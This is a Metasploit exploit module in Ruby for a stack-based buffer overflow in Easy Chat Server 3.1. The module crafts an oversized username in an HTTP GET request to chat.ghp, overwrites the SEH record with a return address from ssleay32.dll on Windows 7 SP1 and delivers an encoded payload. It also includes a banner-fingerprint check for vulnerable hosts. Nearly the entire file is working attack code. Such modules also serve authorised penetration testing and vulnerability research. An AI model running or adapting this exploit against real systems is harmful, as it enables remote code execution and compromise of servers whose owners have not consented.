##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::Seh

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Easy Chat Server 3.1 Stack Buffer Overflow',
      'Description'    => %q{
          This module exploits a stack-based buffer overflow in Easy Chat Server 3.1. 
      },
      'Author'         =>
        [
          'superkojiman',   # Original exploit
          'hyunmini'         # Metasploit re-implementation
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'thread'
        },
      'Payload'        =>
        {
          'Space'    => 2000,
          'BadChars' => "\x00\x20",
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          [	'Windows 7 SP1', { 'Ret'  => 0x10010e1e } ] # ssleay32.dll
        ],
	  'DefaultTarget'  => 0
    ))

    register_options(
      [
        Opt::RPORT(80),
        OptString.new('PATH', [true, 'installed path', 'c:\\EFS Software\\Easy Chat Server'])
      ], self.class)
  end

  def check
    info = http_fingerprint  # check method
    if info and (info =~ /Easy Chat Server/)
	  print_status("Vulnerable !!")
      return Exploit::CheckCode::Detected
    end
    return Exploit::CheckCode::Safe
  end

  def exploit
    #path = rand_text_alphanumeric(185 + "#{path}".length)
    username = "A" * (185 + datastore['path'].length)
	username << generate_seh_record(target.ret)
    username << payload.encoded
    username << "D"*315

    print_status("Trying target #{target.name}...")

	connect

	sploit = "GET /chat.ghp?username="
	sploit << username
	sploit << "&password=&room=1&sex=1 HTTP/1.1\r\n\r\n"
	
	sock.put(sploit)

    print_status("Sending Request...")

    handler
	disconnect
  end

end
